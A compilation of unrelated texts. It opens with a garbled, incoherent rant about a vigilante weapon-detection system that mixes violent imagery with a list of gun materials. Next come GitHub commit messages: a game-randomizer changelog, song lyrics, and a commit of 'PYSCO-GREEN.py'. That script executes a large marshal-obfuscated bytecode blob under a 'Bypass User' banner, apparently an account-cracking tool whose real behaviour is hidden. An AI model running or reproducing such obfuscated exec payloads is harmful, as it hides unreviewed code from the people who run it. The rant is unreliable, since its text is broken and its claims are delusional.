nothing else will determine what or how it will come to harm and what will happen in the past or in the current present site of danger and the future it will hold, its called living in someones shadow and taking the law into your own hand(s) because you must lust for life your very human survival which is human self defense in the last moments otherwise you would be on purposefully "dead" by the murderers hand and chosen weapon that it has and did have in your 'o\w/n' crimeScene98cs: As Angel continues to lead, he is not only the chosen (I)nterlocutor, but the chosen 'King\|Pin::;'/?::;\v/? and the chosen law enforcement agent as that is what he is, in disguise. And he is also an amazing familyman and an exemplary father (fig)ure.:;\:|'{+}:[=]:+. To all, because somehow this got tied in. Apparently the one common enemy has done everything that it then can, to destroy-(be)riddle-dilute and effectively technologically capability allude any form of human ideas that would lead to the development of this system and with the right amount of project managing experience and the creation of WhatsApp which I thought I did. I remember it right there, Dad(v). Simply, because you sweat, wait it out and patiently think about your human mortality in and amongst others--v/experiencing their own human mortality and once again, that is 360*48.5*/24/7//::3600:365'\:|:P'. P. So I will leave it there. Now it simply comes down to chemical compositions that each and every weapon, and trust me the protective side and not the [murderers], can think of any weapon that is a 'cause' leading to action of any unnatural causes of someones'elses(victoom)'s own death that they would of have and did'effectively fall then criminal devised which is a victim to and not have should of lived their own protected natural human body, cold harsh reality, life that they so where intended to do:so and this has been protected by the human constitution of the united states of america and various other kinds of human rights, lawful rights, judicial rights and any other cause leading to the full effect of protecting human life to its fullest extent. As I stand as an example as I would long be dead if it wasn't for these same protective forces that keep me alive, I'm Jesus. So moving on. Once we scientifically diagnosis each chemical composition of any form of criminal human weapon that can be used: vis' a ve'. Hitherto, the system must be able to decipher the very difference of a natural form of composition rather than the composition, that this system has determined, to be; a weapon that can take a family members life away from:us. And the more brutal the more grotesque and heinous the more fear, terror and chaos the murderers can boast and then promote about in various held ways of human understanding, let it be a human television or Instagram or even this Facebook that I am on or even inside this very vw:' Chicago, Illinois'vw: public library: which I am told is performing criminal activity at my expense. And the dialect::/v' Stressing from that--stemming from what is the cold harsh reality of systematic violencia. Is that the human race cannot protect itself. 'Crime" often fits into these "4" categories--fRApe, Theft, Violent Harm of the emotional or physical to human bodies which are protected by law and then finally Murder of a victim,--fa family member loved and living but taken away from us. Brutally is best. Sadistic pleasure received monetary gain needed and profited'from:;'v:s☐:/'?. SQ'hou[i]+'. //v.?[]\ Once that determination is made in real-[t]ime as we are only focusing, now currently, about this part of our computer digital architecture that would lead to the current and present which is real-time digital determination of the specific chemical composition. Shaun Terence McGovern is saying that our current digital abilities would and will, for certain-determine these outcomes which is the human ability to kill, with this sort, this very type and this (kind) of human weapon. Then from there it is data logged and saved, the very location of this (typ)e of weapon then "Goods" protective forces can effectively know where this (typ)e of human weapon is down exactly to a point. Where our leader, Angel(street[] nam\v:?/e), can know what to prepare for, what to have alongside him, what to come equipped with-even and then from there and here; if the weapon would be inside of a submersible--off the beaten path--somewhere in the rivers or lakes, unknown to all except the murderer[]s who know where these human weapons are located, most certainly 'the' favourite-"the ruugaz" the (g)uns in Spanish slang[]vcszv[s]{}+, would be currently housed. Thats called a "safe spot" or a "stash spot" or "safe dungaree[]+'. Or even under a baseball diamond at a specific location if you kick up enough dirt and dig far enough, an assault rifle-can be yours, that if used properly can due-significant grotesque damage to a human victim's head and bodi(e)'. (Uzi's) are terrifying-simply-put. And all the rata-tat-tat[]=s:. (In) whic(T)h--f:;/house: where inside the house: and what to, 'Angel," do about 'Dat[]vc(s)0: Futhermore and [:'?moving o[:?n. This digital system that creates this ongoing and in re8l\t/i:me:?0)/:0 net would not'only find all rugaz'089(*)weapo[]ns*+' at once on a global scale, a neighborhood scale, a city-s(c)ale or even a lone-street sc(a)le this 's'Y'ste[]m; |'would continue to find these and every (kind)s of weapons until our protection services which are our --Fforces keeping everyone living at this time[]vo(c)s:. The victims, our family members, are gone but we not need to move on but let us carry more of their spirit with us and celebrate what remnants I have left, of my beloved Un(c)le and although cherished: lead to a very grave and brutal be'gotten' storie: of his own family and w(h)at was done in and known to be done:in:so, righ-:?/in front-of-me and did-not-get--f()'/ to say goodbye on his deathbed, to (M)e. Now what (I) am thinking this this and that, is(), our current now for the foreseeable future--understood human digital precept, and scientific knowing.(1) This prototype that I have devised which is open to upgrades and any and other ideas which is expertise leading to the long drawn-out final conclusion and that is the complete protection of the human body that would be a victim, of the 'apex 8xpredator,'"Chicago Sun-Times:'P'" the-(A)pe, the a(n)imal that-'O'(n)l--y wants to kill and derive this preyful human instinct from this A(c)::'tvav;--and then the grotesque murder-filled--f'sv8egv:llv'satisfaction and that is all and moves on and spends its money and fucktsv its 'Whore(s)'av:. The very human prevention of this--act, because we are all 'V0doctor(s):esg:"'v0:/"here at the end of the day. And will reach our-foregone-and-own-(C)onclusions which is a form of medical diagnosis which is then the right and only lawful forthrite cause which can be seen as a diagnosis of a human victim and the ('M')urderer, at hand our very hand(s). The best ..vsw?/:hand:'?/ that we can grab the perpetrators |:?[is best:]+'?/:'|'':;. This is at Angel's lead and designation, remember he is the best at this and has all of his experience to offer and what comes with it is this Violent leadership that is completely and lawfully necessary to showcase the following examples of what happens to [murders].vo:?/As we continue':To, together us '?Goodt?wTw?::/et(Q)eqque::?Qqwe(ewueP)::w?PTwo::?/decipher and move from manifold to manifold. In real time and the physical world.?:tbExactly the computer digital methods:U(s)ing all of our technological capabilities we have at hand, in a necessary humane way, so it isn't seen as in fact a weapon attack instead, this correct::ways(/z)csc's):0:0'8*(90:')t':'/z; and once again not'in'the'way that you think it should be used leaving the human bodie, or various human bodies ("7scVictim[s]"/7sc_0:)b'ttm'\mm:z/?"?/{+'=}[/=+']:'|':\:;?\z:;"'{P'}[O:P'}+'svzcs_1':s'Human Victims'. The correct methods. The right, compiled human coded digital (nomen)c/ature:[]'+((9'-0'")'Y':'B"CS:YcseoBYe'"":oe"Y//'e'":
P: The method to find the chemical composition:/'the materials, the killing piece, is made'of. Leading to the computer digital architecture, "which is a blueprint," own's sentient determination, the computer's digital structure. That it is a in fact a piece, either a grotesque looking one or an assault looking one or a rather covered and holy looking one or a handheld one that cando significant damage. Which is a significant larger method of a class[]{}();'"P';:'. Then after it has deciphered this chemical and physical composite from the natural order of other things in our Mother Gaia, naturally once again 'her7cs/" understood environment, this manifold would be cho(s)en, (simply because"/) this computer method which issa digital once again-and that it fits these specific requirements and now it must come to a complete secretive and necessary objective conclusion of 'whatitis. That it is in fact a gun.
P'
Con(sis)ting'Of
--P'carbon steel, although they may also include 'stainless steel', 'aluminum', and other ':Px'"alloys'".:OP'"{+'}[+=]:|
Also:as('of):;:'+||:\{P_+/x}'+'s:;'P':{}
-Saltpeter (Potassium nitrate), Sulfur, and Charcoal for gun powder.
-Nitrite, Polymers, and Phosphates for barrel coatings.
-Additives for synthetics (Polymers and synthetics are lighter than metals and easier to produce)
-Raw materials for adhesives, coatings, and laminates.
:/P'"?/
Now there are other methods that could effectively develop, increment, thru' implementation and inheritance and recursive calls and thru' binary search trees and '07heaps07cs:' and any other form of computer which is digital once again and once more--07data 0.8*stru(c)tu[r]:;e'"{':,/P:;}"+:; that effectively determines. You see how good the video games are able to decipher what a beautiful and violent gun looks, like-these-days. This method,:; would be the very similar,:;because we are not in the real physical world anymore we are in the digital makings of what the and this world con(sis)t[s]''?/m'"7ccs/of'":OP''m.>?/:;"'{+'}{+=}[+=]--P:"'?/{+/=}[+=]:|. From this method to that method and data saved which is data logged in order to view the piece after determing from this manifold to next, that this body of evidence effectively has the piece and it must be a factually proven piece" human weapon, and where it is exact located[];

---
## [smclacke/minishell](https://github.com/smclacke/minishell)@[0836ac8cef...](https://github.com/smclacke/minishell/commit/0836ac8cefef40e0343a7fd0025b45302ab4743b)
#### Wednesday 2023-09-27 18:32:13 by smclacke

note to zelf - don't add random shit then not test then spend two hours on segfault due to said stupid shit, thank you goodbye

---
## [Mathx2/AP-Shivers](https://github.com/Mathx2/AP-Shivers)@[6d13dc4944...](https://github.com/Mathx2/AP-Shivers/commit/6d13dc494455bef97e0f1afc8928853f71d5b5ad)
#### Wednesday 2023-09-27 18:39:18 by el-u

lufia2ac: new features, bug fixes, and more (#1549)

### New features

- ***Architect mode***
  Usually the cave is randomized by the game, meaning that each attempt will produce a different dungeon. However, with this new feature the player can, between runs, opt into keeping the same cave. If activated, they will then encounter the same floor layouts, same enemy spawns, and same red chest contents as on their previous attempt.   

- ***Custom item pool***
  Previously, the multiworld item pool consisted entirely of random blue chest items because, well, the permanent checks are blue chests and that's what one would normally get from these. While blue chest items often greatly increase your odds against regular enemies, being able to defeat the Master can be contingent on having an appropriate equipment setup of red chest items (such as Dekar blade) or even enemy drops (such as Hidora rock), most of which cannot normally be obtained from blue chests.
  With the custom item pool option, players now have the freedom to place any cave item into the multiworld itempool for their world.

- ***Enemy floor number, enemy sprite, and enemy movement pattern randomization***
  Experienced players can deduce a lot of information about the opposition they will be facing, for example: Given the current floor number, one can know in advance which of the enemy types will have a chance to spawn on that floor. And when seeing a particular enemy sprite, one can already know which enemy types one might have to face in battle if one were to come in contact with it, and also how that enemy group will move through the dungeon.
  Three new randomization options are added for players who want to spice up their game: one can shuffle which enemy types appear on which floor, one can shuffle which sprite is used by which enemy type, and one can shuffle which movement pattern is used by which sprite.

- ***EXP modifier***
  Just a simple multiplier option to allow people to level up faster. (For technical reasons, the maximum amount of EXP that can be awarded for a single enemy is limited to 65535, but even with the maximum allowed modifier of 500% there are only 6 enemy types in the cave that can reach this cap.)


### Balance change

- ***proportionally adjust chest type distribution to accommodate increased blue chest chance***
  One of the main problems that became apparent in the current version has to do with the distribution of chest contents. The game considers 6 categories, namely: consumable (mostly non-restorative), consumable (restorative), blue chest item, spell, gear, and weapon. Since only blue chests count as multiworld locations, we want to have a mechanism to customize the blue chest chance.
  Given how the chest types are detetermined in game, a naive implementation of an increased blue chest chance causes only the consumable chance to be decreased in return. In practice, this has resulted in some players of worlds with a high blue chest chance struggling (more than usual) to keep their party alive because they were always low on comsumables that restore HP and MP.
  The new algorithm tries to avoid this one-sided effect by having an increase in blue chest chance resulting in a decrease of all other types, calculated in such a way that the relative distribution of the other 5 categories stays (approximately) the same.


### Bug fixes

- ***prevent using party member items if character is already in party***
  This should have been changed at the same time that 6eb00621e39c930f5746f5f3c69a6bc19cd0e84a was made, but oh well... 

- ***fix glitched sprite when opening a chest immediately after receiving an item***
  When opening a chest right after receiving a multiworld item (such that there were two item get animations in the exact same iteration of the game main loop), the item from the chest would display an incorrect sprite in the wrong place. Fixed by cleaning up some relevant memory addresses after getting the multiworld item.

- ***fix death link***
  There was a condition in `deathlink_kill_player` that looked kinda smart (it checked the time against `last_death_link`), but actually wasn't smart at all because `deathlink_kill_player` is executed as an async task and the main thread will update `last_death_link` after creating the task, meaning that whether or not the incoming death link would actually be passed to the game seems to have been up to a race condition. Fixed by simply removing that check.


### Other

- ***add Lufia II Ancient Cave (and SMW) to the network diagram***
  These two games were missing from the SNES sector.

- ***implement get_filler_item_name***
  Place a restorative consumable instead of a completely random item. (Now the only known problem with item links in lufia2ac is... that noone has ever tested item links. But this should be an improvement at least. Anyway, now #1172 can come ;)
  And btw., if you think that the implementation of random selection in this method looks weird, that's because it is indeed weird. (It tries to recreate the algorithm that the game itself uses when it generates a replacement item for a chest that would contain a spell that the party already knows.)

- ***store all options in a dataclass***
  This is basically like using #993 (but without actual support from core). It makes the lufia2ac world code much nicer to maintain because one doesn't have to change 5 different places anymore when adding or renaming an option.

- ***remove master_hp.scale***
  I have to admit: `scale` was a mistake. Never have I seen a single option value cause so many user misconceptions. Some people assume it affects enemies other than the Master; some people assume it affects stats other than HP; and many people will just assume it is a magic option that will somehow counterbalance whatever settings combination they are currently trying to shoot themselves in the foot with.
  On top of that, the `scale` mechanism probably doesn't provide a good user experience even when used for its intended purpose (since having reached floor XY in general doesn't mean you will have the power to deplete XY% of the Masters usual HP; especially given that, due to the randomness of loot, you are never guaranteed to be able to defeat the vanilla Master even when you have cleared 100% of the floors).
  The intended target audience of the `master_hp` option are people who want to fight the Master (and know how to fight it), but also want to lessen (to a degree of their choosing) the harsh dependence on the specific equipment setups that are usually required to win this fight even when having done all 99 floors. They can achieve this by setting the `master_hp` option to a numeric value appropriate for the level of challenge they are seeking. Therefore, nothing of value should be lost by removing the special `scale` value from the `master_hp` option, while at the same time a major source of user confusion will be eliminated.

- ***typing***
  This (combined with the switch to the option dataclass) greatly reduces the typing problems in the lufia2ac world. The remaining typing errors mostly fall into 4 categories:
  1. Lambdas with defaults (which seem to be incorrectly reported as an error due to a mypy bug)
  1. Classmethods that return instances (which could probably be improved using PEP 673 "Self" types, but that would require Python 3.11 as the minimum supported version)
  1. Everything that inherits from TextChoice (which is a typing mess in core)
  1. Everything related to asar.py (which does not have proper typing and lies outside of this project)

## How was this tested?

https://discord.com/channels/731205301247803413/1080852357442707476 and others

---
## [Danielkaas94/DTAP](https://github.com/Danielkaas94/DTAP)@[676c220aaa...](https://github.com/Danielkaas94/DTAP/commit/676c220aaa9731bec2197ceea23d2a0c29b84311)
#### Wednesday 2023-09-27 18:55:38 by Daniel Kaas Bundgaard Jørgensen

(Don't Fear) The Reaper

All our times have come
Here, but now they're gone
Seasons don't fear the reaper
Nor do the wind, the sun, or the rain

(We can be like they are)
Come on, baby
(Don't fear the reaper)
Baby, take my hand
(Don't fear the reaper)
We'll be able to fly
(Don't fear the reaper)
Baby, I'm your man

La, la la, la la
La, la la, la la

Valentine is done
Here, but now they're gone
Romeo and Juliet
Are together in eternity
(Romeo and Juliet)

40,000 men and women every day
(Like Romeo and Juliet)
40,000 men and women every day
(Redefine happiness)
Another 40,000 coming every day

(We can be like they are)
Come on, baby
(Don't fear the reaper)
Baby, take my hand
(Don't fear the reaper)
We'll be able to fly
(Don't fear the reaper)
Baby, I'm your man

La, la la, la la
La, la la, la la

Love of two is one
Here, but now they're gone
Came the last night of sadness
And it was clear she couldn't go on

Then the door was open, and the wind appeared
The candles blew, and then disappeared
The curtains flew, and then he appeared
(Saying, "Don't be afraid")

Come on, baby
(And she had no fear)
And she ran to him
(Then they started to fly)
They looked backward, and said goodbye

(She had become like they are)
She had taken his hand
(She had become like they are)
Come on, baby
(Don't fear the reaper)

---
## [PYSCO-XD/PYSCO-GREEN](https://github.com/PYSCO-XD/PYSCO-GREEN)@[a349ff3ace...](https://github.com/PYSCO-XD/PYSCO-GREEN/commit/a349ff3ace81c542c497cfd714b432adb6ce4fb4)
#### Wednesday 2023-09-27 18:57:26 by Python Programming

Update PYSCO-GREEN.py

#Sc By Jobaid X Farhan X Isty
# https://wa.me/4520384418
#Bypass User Fuck Your Mom
#__________[PSYCO-XD]__________
import marshal
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\xf3`\r\x00\x00\x97\x00d\x00d\x01l\x00m\x01Z\x01\x01\x00d\x00d\x02l\x00Z\x00d\x00d\x02l\x02Z\x02d\x00d\x02l\x03Z\x03d\x00d\x02l\x04Z\x04d\x00d\x02l\x05Z\x05\x02\x00e\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x07d\x04\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00d\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x07d\x07\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00d\t\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x07d\n\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00d\x0b\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00d\x0c\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x07d\r\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00d\x0e\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00d\x0f\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x07d\x10\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00d\x11l\x08m\tZ\n\x01\x00d\x00d\x12l\x0bm\x0cZ\r\x01\x00d\x00d\x02l\x00Z\x00d\x00d\x02l\x0eZ\x0ed\x00d\x02l\x0fZ\x0fd\x00d\x02l\x08Z\x08d\x00d\x02l\x10Z\x10d\x00d\x02l\x11Z\x11d\x00d\x02l\x0eZ\x0ed\x00d\x02l\x12Z\x12d\x00d\x02l\x13Z\x13d\x00d\x02l\x14Z\x14d\x00d\x02l\x15Z\x15d\x00d\x02l\x16Z\x16d\x00d\x02l\x17Z\x17d\x00d\x11l\x08m\tZ\n\x01\x00d\x00d\x12l\x0bm\x0cZ\x18\x01\x00d\x00d\x02l\x02Z\x02d\x00d\x02l\x00Z\x00d\x00d\x02l\x11Z\x11d\x00d\x02l\x13Z\x13d\x00d\x02l\x10Z\x10d\x00d\x02l\x0eZ\x0ed\x00d\x02l\x14Z\x14d\x00d\x02l\x19Z\x19d\x00d\x02l\x16Z\x16d\x00d\x02l\x02Z\x02d\x00d\x02l\x0fZ\x0fd\x00d\x12l\x0bm\x0cZ\r\x01\x00d\x00d\x02l\x1aZ\x1ad\x00d\x13l\x1bm\x1cZ\x1c\x01\x00d\x00d\x02l\x19Z\x19\t\x00d\x00d\x02l\x0fZ\x0fn&#\x00e\x1d$\x00r\x1e\x01\x00\x02\x00e\x07d\x14\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00d\x15\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00Y\x00n\x04w\x00x\x03Y\x00w\x01\t\x00d\x00d\x02l\x0bZ\x1en&#\x00e\x1d$\x00r\x1e\x01\x00\x02\x00e\x07d\x16\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00d\x17\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00Y\x00n\x04w\x00x\x03Y\x00w\x01\t\x00d\x00d\x02l\x08Z\x08nF#\x00e\x1d$\x00r>\x01\x00\x02\x00e\x07d\x18\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00d\x19\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00d\x1a\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00d\x1b\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00Y\x00n\x04w\x00x\x03Y\x00w\x01d\x00d\x02l\x0fZ\x0fd\x00d\x02l\x00Z\x00d\x00d\x02l\x14Z\x14d\x00d\x02l\x08Z\x08d\x00d\x02l\x16Z\x16d\x00d\x02l\x11Z\x11d\x00d\x02l\x10Z\x10d\x00d\x02l\x13Z\x13d\x00d\x02l\x0eZ\x0ed\x00d\x02l\x12Z\x12d\x00d\x02l\x15Z\x15d\x00d\x02l\x1fZ\x1fd\x00d\x02l Z d\x00d\x02l\x02Z\x02d\x00d\x02l!Z!d\x00d\x02l\x03Z\x03d\x00d\x12l\x0bm\x0cZ"\x01\x00d\x00d\x1cl\x12m\x12Z\x12\x01\x00d\x00d\x11l\x08m\tZ\t\x01\x00\x02\x00e\x12j#\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00Z$e$j%\x00\x00\x00\x00\x00\x00\x00\x00Z&g\x00d\x1d\xa2\x01Z\'\t\x00e&d\x00k\x00\x00\x00\x00\x00s\x06e&d\x1ek\x04\x00\x00\x00\x00r\n\x02\x00e(\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00e&d\x1fz\n\x00\x00Z)n\x15#\x00e*$\x00r\r\x01\x00\x02\x00e(\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00Y\x00n\x04w\x00x\x03Y\x00w\x01\x02\x00e\x12j#\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00Z+e+j,\x00\x00\x00\x00\x00\x00\x00\x00Z-e+j%\x00\x00\x00\x00\x00\x00\x00\x00Z.e+j/\x00\x00\x00\x00\x00\x00\x00\x00Z0e\'e)\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00Z1d Z2d!Z3d"Z4d#Z5d$Z6d%Z7d&Z8d\'Z9d(Z:d)Z;d*Z<d+Z=d,Z>d-Z?d.Z@d/ZAd0ZBd1ZCd2ZDd"Z<d*ZEd#ZFd$ZGd3Z5d4Z6d5Z;d%ZHd&ZId\'ZJd5Z4d6ZKd7ZLd8ZMd9ZNd:Z@d;ZOd<ZPd)ZQd#ZRd"ZSd4ZTd=ZUd>ZVd?ZWd@ZXe4e5e6e7e8e9e:e;g\x08ZY\x02\x00e\x0ejZ\x00\x00\x00\x00\x00\x00\x00\x00eY\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00Z[\x02\x00e\x12j#\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00Z#e#\xa0\\\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00dA\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00Z]\x02\x00e\x12j#\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00Z+e+j,\x00\x00\x00\x00\x00\x00\x00\x00Z-e+j%\x00\x00\x00\x00\x00\x00\x00\x00Z.e+j/\x00\x00\x00\x00\x00\x00\x00\x00Z0g\x00Z^g\x00Z_g\x00Z`g\x00Zag\x00Zbd\x00acg\x00adg\x00aed\x00acdBZfdCZgdDZhdEdFi\x01ZidGdHdIdJdKdLdMdNdOdPdQdRdS\x9c\x0cZjdTZkg\x00Zlg\x00ZmdFg\x01Zne\x0ejo\x00\x00\x00\x00\x00\x00\x00\x00Zp\x02\x00eqdU\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00]\xbcZrdVZs\x02\x00e\x0ejZ\x00\x00\x00\x00\x00\x00\x00\x00g\x00dW\xa2\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00ZtdXZu\x02\x00e\x0ejZ\x00\x00\x00\x00\x00\x00\x00\x00g\x00dY\xa2\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00Zv\x02\x00e\x0ejw\x00\x00\x00\x00\x00\x00\x00\x00d\x1fdZ\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00Zx\x02\x00e\x0ejZ\x00\x00\x00\x00\x00\x00\x00\x00g\x00dY\xa2\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00Zyd[Zz\x02\x00e\x0ejw\x00\x00\x00\x00\x00\x00\x00\x00d\\d]\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00Z{d^Z|\x02\x00e\x0ejw\x00\x00\x00\x00\x00\x00\x00\x00d_d`\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00Z}\x02\x00e\x0ejw\x00\x00\x00\x00\x00\x00\x00\x00dadb\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00Z~dcZ\x7fes\x9b\x00ddet\x9b\x00deeu\x9b\x00ev\x9b\x00ex\x9b\x00ey\x9b\x00dfez\x9b\x00e{\x9b\x00dge|\x9b\x00dge}\x9b\x00dge~\x9b\x00dde\x7f\x9b\x00\x9d\x13Z\x80el\xa0\x81\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\x80\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x8c\xbd\x02\x00eqdh\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00]\x94Z\x82diZ\x83\x02\x00e\x0ejw\x00\x00\x00\x00\x00\x00\x00\x00d\x1fdj\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00ZtdkZu\x02\x00e\x0ejw\x00\x00\x00\x00\x00\x00\x00\x00d\x1fdj\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00ZvdlZx\x02\x00e\x0ejw\x00\x00\x00\x00\x00\x00\x00\x00d\x1fdj\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00ZydmZz\x02\x00e\x0ejw\x00\x00\x00\x00\x00\x00\x00\x00d\x1fd\x1e\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00Z{dnZ|doZ}\x02\x00e\x0ejw\x00\x00\x00\x00\x00\x00\x00\x00d\x1fdp\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00Z~dqZ\x7fe\x83\x9b\x00et\x9b\x00eu\x9b\x00ev\x9b\x00ex\x9b\x00ey\x9b\x00ez\x9b\x00e{\x9b\x00e|\x9b\x00e}\x9b\x00e~\x9b\x00e\x7f\x9b\x00\x9d\x0cZ\x80el\xa0\x81\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\x80\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x8c\x95g\x00dr\xa2\x01Z\x84ds\x84\x00Z\x85dt\x84\x00Z\x86du\x84\x00Z\x87d\x00acg\x00Z`g\x00Z^g\x00Z\x88dv\x84\x00Z\x89d\x00dwl\x13m\x8aZ\x8b\x01\x00d\x00dxl\x00m\x06Z\x8c\x01\x00\x02\x00e\x8d\x02\x00e\x8b\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00dp\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00Z\x8ee\x8ed\x1ek\x04\x00\x00\x00\x00r\x08e\x8ed\x1ez\n\x00\x00Z\x83dyZ\x8fn\x04e\x8eZ\x83dzZ\x8fd{\x84\x00Z\x90d|\x84\x00Z\x91\x02\x00e\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x92d}\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00Z\x93\t\x00\x02\x00e\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x07e6\x9b\x00d~e6\x9b\x00d\x7fe6\x9b\x00d\x80eT\x9b\x00d\x81e\x93\x9b\x00dd\x9d\n\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x0fj\x94\x00\x00\x00\x00\x00\x00\x00\x00d\x82\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x95\x00\x00\x00\x00\x00\x00\x00\x00Z\x96\x02\x00e\x86d\x83e\x96z\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x07d\x84\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x07d\x85\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00d\x02l\x97Z\x97d\x00Z\x98e\x98d\x86k\x00\x00\x00\x00\x00rY\x02\x00e\x92d\x87\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00Z\x99e\x99d\x88k\x02\x00\x00\x00\x00r\'\x02\x00e\